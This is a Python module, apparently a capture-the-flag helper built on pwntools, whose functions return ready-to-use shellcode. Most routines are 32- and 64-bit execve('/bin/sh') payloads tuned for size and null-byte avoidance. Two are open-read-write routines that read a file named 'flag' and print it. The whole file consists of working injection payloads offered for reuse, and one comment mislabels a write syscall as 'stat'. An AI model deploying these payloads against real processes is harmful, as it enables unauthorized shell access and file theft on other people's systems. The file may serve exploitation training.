#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import log


def x64_bin_sh_standard():
    log.info("标准shellcode 31 byte")
    # 标准shellcode 31 byte
    shellcode = """
xor rdi,rdi
xor rsi,rsi
xor rdx,rdx
xor rax,rax
push rax
mov rbx,0x68732f2f6e69622f
push rbx
mov rdi,rsp
mov al,0x3b
syscall
"""
    return shellcode


def x64_bin_sh_have_00():
    log.info("最短有\\x00 22 byte")
    shellcode = """
xor rsi,rsi
mul esi
mov rbx,0x68732f6e69622f
push rbx
push rsp
pop rdi
mov al, 59
syscall
"""
    return shellcode


def x64_bin_sh_without_00():
    log.info("最短无\\x00 23 byte")
    shellcode = """
    xor rsi,rsi
mul esi
push rax
mov rbx,0x68732f2f6e69622f
push rbx
push rsp
pop rdi
mov al, 59
syscall
"""
    return shellcode


def x86_bin_sh_standard():
    log.info("标准shellcode 23 byte")
    shellcode = """
xor ecx,ecx
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor eax,eax
mov al,0xB
int 0x80
"""
    return shellcode


def x86_bin_sh_have_00():
    log.info("有\\x00最短 20 byte")
    shellcode = """
xor ecx,ecx               
mul ecx                   
mov al,0xb                
push 0x68732f             
push 0x6e69622f           
mov ebx,esp               
int 0x80
    """
    return shellcode


def x86_bin_sh_without_00():
    # 无"\x00"最短 21 byte
    shellcode = """
xor ecx,ecx
mul ecx
push eax
mov al,0xb
push 0x68732f2f   
push 0x6e69622f   
mov ebx,esp
int 0x80
    """
    return shellcode


def orw_shellcode_1():
    shellcode = """
sub rsp, 0x808
push 0x67616c66 ;// flag
mov rdi, rsp
xor esi, esi
mov eax, 2
syscall         ;// open

cmp eax, 0
js failed

mov edi, eax
mov rsi, rsp
mov edx, 0x100
xor eax, eax
syscall         ;// read

mov edx, eax
mov rsi, rsp
mov edi, 1
mov eax, edi
syscall         ;// write

jmp exit

failed:
push 0x6c696166
mov edi, 1
mov rsi, rsp
mov edx, 4
mov eax, edi
syscall         ;// stat

exit:
xor edi, edi
mov eax, 231
syscall         ;// exit_group
    """
    return shellcode


def orw_shellcode_2():
    shellcode = """
mov rax, 0x67616c662f2e ;// ./flag
push rax

mov rdi, rsp    ;// ./flag
mov rsi, 0      ;// O_RDONLY
xor rdx, rdx    ;
mov rax, 2      ;// SYS_open
syscall

mov rdi, rax    ;// fd 
mov rsi, rsp    ;
mov rdx, 1024   ;// nbytes
mov rax, 0      ;// SYS_read
syscall

mov rdi, 1      ;// fd 
mov rsi, rsp    ;// buf
mov rdx, rax    ;// count 
mov rax, 1      ;// SYS_write
syscall

mov rdi, 0      ;// error_code
mov rax, 60
syscall         ;// SYS_exit
    """
    return shellcode
